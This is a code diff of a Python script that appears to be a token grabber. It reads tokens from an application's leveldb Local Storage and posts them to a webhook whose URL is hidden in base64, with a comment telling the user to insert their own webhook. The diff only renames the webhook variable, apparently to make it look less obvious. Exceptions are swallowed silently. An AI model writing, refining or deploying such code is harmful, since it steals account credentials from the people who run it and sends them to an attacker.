@@ -3,7 +3,7 @@ import re
 import json
 from urllib.request import Request, urlopen
 import base64
-WEBHOOK_URL = base64.b64decode('').decode() # insert ur webhook encoded in base64 
+wh_url = base64.b64decode('').decode() # insert ur webhook encoded in base64 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
@@ -58,7 +58,7 @@ def main():
     payload = json.dumps({'content': message})
 
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        req = Request(wh_url, data=payload.encode(), headers=headers)
         urlopen(req)
     except:
         pass
